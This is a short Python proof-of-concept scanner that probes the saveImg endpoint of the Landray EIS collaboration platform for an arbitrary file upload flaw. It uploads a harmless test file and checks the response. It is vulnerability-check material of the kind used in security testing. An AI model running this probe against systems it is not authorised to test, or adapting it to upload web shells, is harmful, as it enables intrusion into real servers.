import requests
import urllib

def verify(url):
    relsult = {
        'name': '蓝凌EIS智慧协同平台saveImg接口存在任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu'
    }
    data = '''------WebKitFormBoundaryxdgaqmqu
    Content-Disposition: form-data; name="file"filename="hello.txt"
    Content-Type: text/html

    hellohello
    ------WebKitFormBoundaryxdgaqmqu--'''
    vurl = urllib.parse.urljoin(url, "/eis/service/api.aspx?action=saveImg")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'editor_img' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult